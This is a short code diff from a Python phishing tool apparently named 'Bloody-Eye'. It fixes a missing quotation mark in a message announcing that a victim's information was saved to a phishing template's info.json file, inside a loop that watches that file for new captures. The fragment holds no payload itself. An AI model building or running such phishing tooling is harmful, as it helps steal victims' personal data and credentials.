@@ -601,7 +601,7 @@ exit();""")
             global stat_file
             if not str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size) == stat_file:
                 stat_file = str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size)
-                print(Fore.RED+" [~] Victim's information saved in [info.json])
+                print(Fore.RED+" [~] Victim's information saved in [info.json]")
     while True:
         info()
         userin()
